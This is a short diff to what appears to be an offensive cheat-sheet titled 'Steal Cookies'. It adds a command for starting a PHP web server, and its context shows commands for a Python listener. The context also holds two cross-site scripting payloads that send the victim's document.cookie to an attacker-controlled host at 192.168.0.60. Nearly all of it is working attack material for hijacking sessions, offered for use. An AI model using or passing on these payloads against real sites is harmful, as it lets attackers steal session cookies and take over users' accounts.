@@ -4,6 +4,8 @@ Steal Cookies
 # Use ruby SSL server for SSL connections
 # Start Python Web Server
 python -m SimpleHTTPServer 80
+# Start PHP Web Server
+php -S xxx.xxx.xxx.xxx:<port>
 
 <script>document.location="http://192.168.0.60/?c="+document.cookie;</script>
 <script>new Image().src="http://192.168.0.60/index.php?c="+document.cookie;</script>
